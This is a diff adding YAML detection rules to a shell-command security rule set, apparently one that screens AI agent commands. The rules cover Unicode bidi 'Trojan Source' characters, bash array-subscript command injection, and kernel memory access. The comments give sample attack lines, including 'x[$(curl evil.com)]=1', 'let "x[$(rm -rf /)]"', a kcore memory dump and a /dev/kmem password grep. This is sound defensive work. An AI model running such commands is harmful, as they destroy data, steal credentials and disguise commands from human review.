@@ -9912,3 +9912,212 @@ rules:
     decision: "BLOCK"
     confidence: 0.90
     reason: "AWK getline reading output from dangerous command — captures output from network tools, interpreters, or encoding utilities. Often used to stage data for exfiltration or further execution. CWE-78, MITRE T1059.004."
+
+  # ===========================================================================
+  # Unicode Bidi Text Reordering Attacks (CVE-2021-42574)
+  # ===========================================================================
+  #
+  # Unicode bidirectional control characters can make shell commands appear
+  # benign when displayed while the shell executes entirely different logic.
+  #
+  # Key dangerous characters:
+  #   U+202A  Left-to-Right Embedding  (LRE)
+  #   U+202B  Right-to-Left Embedding  (RLE)
+  #   U+202C  Pop Directional Formatting (PDF)
+  #   U+202D  Left-to-Right Override   (LRO)
+  #   U+202E  Right-to-Left Override   (RLO) — most dangerous
+  #   U+2066  Left-to-Right Isolate    (LRI)
+  #   U+2067  Right-to-Left Isolate    (RLI)
+  #   U+2068  First Strong Isolate     (FSI)
+  #   U+2069  Pop Directional Isolate  (PDI)
+  #   U+200F  Right-to-Left Mark       (RLM)
+  #   U+200E  Left-to-Right Mark       (LRM)
+  #
+  # Attack: An adversary crafts a command containing bidi overrides so that
+  # when a human reviews the command in a terminal or code review UI, the
+  # displayed text looks safe, but the actual byte sequence executed by the
+  # shell is malicious. CVE-2021-42574 ("Trojan Source") demonstrated this
+  # in source code; the same technique applies to shell commands.
+  #
+  # There is NO legitimate reason for shell commands to contain bidi control
+  # characters. Even internationalized text in echo/printf arguments would
+  # use locale-aware tools, not raw bidi overrides in the command string.
+  #
+  # Detection: Match the UTF-8 byte sequences of bidi control characters.
+  # U+202A-202E → \xE2\x80\xAA through \xE2\x80\xAE
+  # U+2066-2069 → \xE2\x81\xA6 through \xE2\x81\xA9
+  # U+200E-200F → \xE2\x80\x8E and \xE2\x80\x8F
+  #
+  # TP: echo "\xe2\x80\xaemalicious\xe2\x80\xac" (contains RLO+PDF)
+  # TP: curl "http://\xe2\x81\xa7evil.com\xe2\x81\xa9/api" (RLI in URL)
+  # TN: echo "hello world" (normal ASCII)
+  # TN: echo "日本語テスト" (legitimate non-Latin chars, no bidi)
+
+  # --- BLOCK: Bidi override characters (RLO U+202E, LRO U+202D) ---
+  # These are the most dangerous — they reverse displayed text direction.
+  - id: "ts-block-bidi-override"
+    taxonomy: "unauthorized-execution/obfuscation/unicode-bidi-reordering"
+    match:
+      command_regex: "[\\x{202D}\\x{202E}]"
+    decision: "BLOCK"
+    confidence: 0.98
+    reason: "Unicode bidirectional override character detected (U+202D LRO or U+202E RLO). These invisible characters reverse displayed text direction, making malicious commands appear safe during review — CVE-2021-42574 'Trojan Source' applied to shell commands. No legitimate shell command contains bidi overrides. MITRE T1036.005, T1027."
+
+  # --- BLOCK: Bidi embedding characters (LRE U+202A, RLE U+202B, PDF U+202C) ---
+  - id: "ts-block-bidi-embedding"
+    taxonomy: "unauthorized-execution/obfuscation/unicode-bidi-reordering"
+    match:
+      command_regex: "[\\x{202A}\\x{202B}\\x{202C}]"
+    decision: "BLOCK"
+    confidence: 0.95
+    reason: "Unicode bidirectional embedding character detected (U+202A LRE, U+202B RLE, or U+202C PDF). Bidi embeddings reorder displayed text to disguise malicious shell commands — CVE-2021-42574. MITRE T1036.005, T1027."
+
+  # --- BLOCK: Bidi isolate characters (LRI U+2066, RLI U+2067, FSI U+2068, PDI U+2069) ---
+  - id: "ts-block-bidi-isolate"
+    taxonomy: "unauthorized-execution/obfuscation/unicode-bidi-reordering"
+    match:
+      command_regex: "[\\x{2066}\\x{2067}\\x{2068}\\x{2069}]"
+    decision: "BLOCK"
+    confidence: 0.95
+    reason: "Unicode bidirectional isolate character detected (U+2066-2069). Bidi isolates create text regions with independent directionality — can hide malicious command fragments from visual review. CVE-2021-42574. MITRE T1036.005, T1027."
+
+  # --- AUDIT: Invisible directional marks (LRM U+200E, RLM U+200F) ---
+  # These are less dangerous (don't reorder text) but have no place in shell
+  # commands. AUDIT rather than BLOCK since some copy-paste from web could
+  # introduce them accidentally.
+  - id: "ts-audit-bidi-marks"
+    taxonomy: "unauthorized-execution/obfuscation/unicode-bidi-reordering"
+    match:
+      command_regex: "[\\x{200E}\\x{200F}]"
+    decision: "AUDIT"
+    confidence: 0.80
+    reason: "Unicode directional mark detected (U+200E LRM or U+200F RLM). While less dangerous than bidi overrides, these invisible zero-width characters have no legitimate use in shell commands and may indicate text manipulation. CVE-2021-42574."
+
+  # ===========================================================================
+  # Bash Array Subscript Code Injection
+  # ===========================================================================
+  #
+  # In bash, array subscripts are evaluated via arithmetic expansion, which
+  # triggers command substitution. This means:
+  #
+  #   x[$(malicious_command)]=1
+  #   declare -a "x[$(whoami)]"
+  #   unset "x[$(id)]"
+  #   echo ${x[$(cat /etc/passwd)]}
+  #   (( x[$(curl evil.com)] ))
+  #   let "x[$(rm -rf /)]"
+  #
+  # All execute the embedded command during array index evaluation. The bash
+  # manual states: "The subscript is treated as an arithmetic expression that
+  # must evaluate to a number." But arithmetic expressions process $() first.
+  #
+  # This is devastating because:
+  # 1. The malicious command is buried inside an array subscript — not at
+  #    the start of the command, not in a pipe, not after eval
+  # 2. It executes during VARIABLE EXPANSION, not explicit invocation
+  # 3. It bypasses all command-name-based detection
+  # 4. Even `declare` and `unset` — typically safe builtins — become vectors
+  #
+  # No legitimate development workflow uses command substitution inside array
+  # subscripts. Legitimate array indexing uses integers or string keys.
+  #
+  # TP: x[$(curl evil.com)]=1
+  # TP: declare -a "arr[$(whoami)]"
+  # TN: arr[0]=value (normal integer index)
+  # TN: declare -A map; map[key]=value (associative array)
+
+  # --- BLOCK: Array subscript with command substitution ---
+  - id: "ts-block-array-subscript-injection"
+    taxonomy: "unauthorized-execution/obfuscation/array-subscript-injection"
+    match:
+      command_regex: "\\[\\s*\\$\\([^)]+\\)\\s*\\]"
+      command_regex_exclude: "^(echo|printf)\\s|^(gh|git)\\s.*--(?:body|body-file|message|notes|description|title|annotation|comment)\\b"
+    decision: "BLOCK"
+    confidence: 0.97
+    reason: "Bash array subscript contains command substitution $() — bash evaluates array indices via arithmetic expansion, which triggers command substitution. The embedded command executes during variable expansion, completely bypassing command-name detection. No legitimate workflow uses $() in array subscripts. CWE-78, MITRE T1059.004."
+
+  # --- BLOCK: Array subscript with backtick command substitution ---
+  - id: "ts-block-array-subscript-backtick"
+    taxonomy: "unauthorized-execution/obfuscation/array-subscript-injection"
+    match:
+      command_regex: "\\[\\s*`[^`]+`\\s*\\]"
+      command_regex_exclude: "^(echo|printf)\\s|^(gh|git)\\s.*--(?:body|body-file|message|notes|description|title|annotation|comment)\\b"
+    decision: "BLOCK"
+    confidence: 0.97
+    reason: "Bash array subscript contains backtick command substitution — equivalent to $() form but using legacy syntax. The backtick expression executes during array index evaluation. CWE-78, MITRE T1059.004."
+
+  # ===========================================================================
+  # Kernel Memory Access (/proc/kcore, /dev/kmem, /proc/kallsyms)
+  # ===========================================================================
+  #
+  # These kernel interfaces expose raw kernel memory and symbol addresses:
+  #
+  #   /proc/kcore   — Full physical memory dump in ELF core format. Contains
+  #                   ALL kernel memory including encryption keys, credentials,
+  #                   and in-memory secrets. Readable by root.
+  #   /dev/kmem     — Direct kernel virtual memory read/write access. Can
+  #                   modify running kernel data structures (rootkit injection).
+  #   /proc/kallsyms — Kernel symbol table with addresses. Defeats KASLR
+  #                   (Kernel Address Space Layout Randomization), enabling
+  #                   targeted kernel exploits.
+  #
+  # Reading /proc/kcore can extract:
+  #   - TLS session keys from kernel memory
+  #   - dm-crypt/LUKS master keys
+  #   - In-memory credentials from any process
+  #   - Kernel data structures for rootkit development
+  #
+  # /proc/kallsyms is less severe (just addresses) but defeats KASLR,
+  # which is a critical kernel defense. AUDIT rather than BLOCK since
+  # kernel developers may legitimately need it.
+  #
+  # TP: dd if=/proc/kcore of=/tmp/memdump bs=4096
+  # TP: strings /dev/kmem | grep -i password
+  # TN: cat /proc/meminfo (safe kernel stats)
+  # TN: cat /proc/cpuinfo (safe hardware info)
+
+  # --- BLOCK: Reading /proc/kcore (full kernel memory dump) ---
+  - id: "ts-block-proc-kcore-read"
+    taxonomy: "privilege-escalation/kernel-memory/proc-kcore-access"
+    match:
+      command_regex: "(cat|strings|dd|xxd|hexdump|od|cp|scp|rsync|head|tail|less|more|file|readelf|objdump)\\s+.*/proc/kcore"
+    decision: "BLOCK"
+    confidence: 0.98
+    reason: "Reading /proc/kcore dumps the entire kernel physical memory in ELF format — exposes encryption keys (dm-crypt, TLS), in-memory credentials, and kernel data structures. Defeats all userspace memory protections. MITRE T1003.007, T1005."
+
+  # --- BLOCK: Redirecting /proc/kcore to file/network ---
+  - id: "ts-block-proc-kcore-redirect"
+    taxonomy: "privilege-escalation/kernel-memory/proc-kcore-access"
+    match:
+      command_regex: "/proc/kcore"
+      command_regex_exclude: "^(echo|printf|cat)\\s+['\"]|^#|^(gh|git)\\s.*--(?:body|body-file|message|notes|description|title|annotation|comment)\\b"
+    decision: "AUDIT"
+    confidence: 0.90
+    reason: "Reference to /proc/kcore detected — kernel physical memory dump file. Any access to this file can expose encryption keys and in-memory credentials. MITRE T1003.007."
+
+  # --- BLOCK: Reading /dev/kmem (kernel virtual memory) ---
+  - id: "ts-block-dev-kmem-access"
+    taxonomy: "privilege-escalation/kernel-memory/dev-kmem-access"
+    match:
+      command_regex: "(cat|strings|dd|xxd|hexdump|od|cp|head|tail|python[23]?|perl|ruby)\\s+.*/dev/kmem"
+    decision: "BLOCK"
+    confidence: 0.98
+    reason: "Accessing /dev/kmem provides direct kernel virtual memory read/write — can extract credentials, inject rootkits, or modify kernel data structures. More dangerous than /proc/kcore because it supports writes. MITRE T1014, T1003.007."
+
+  # --- BLOCK: Writing to /dev/kmem (kernel rootkit injection) ---
+  - id: "ts-block-dev-kmem-write"
+    taxonomy: "privilege-escalation/kernel-memory/dev-kmem-access"
+    match:
+      command_regex: "(>|tee|dd\\s+.*of=)\\s*/dev/kmem"
+    decision: "BLOCK"
+    confidence: 0.99
+    reason: "Writing to /dev/kmem modifies live kernel memory — classic rootkit injection vector. Can patch kernel functions, hide processes, or disable security modules. MITRE T1014, T1601."
+
+  # --- AUDIT: Reading /proc/kallsyms (KASLR bypass) ---
+  - id: "ts-audit-proc-kallsyms"
+    taxonomy: "privilege-escalation/kernel-memory/kallsyms-kaslr-bypass"
+    match:
+      command_regex: "(cat|strings|head|tail|grep|less|more|sort|awk)\\s+.*/proc/kallsyms"
+    decision: "AUDIT"
+    confidence: 0.85
+    reason: "Reading /proc/kallsyms exposes kernel symbol addresses, defeating KASLR (Kernel Address Space Layout Randomization). Enables targeted kernel exploits by providing exact function addresses. Legitimate for kernel debugging but high-risk in AI agent context. MITRE T1082."
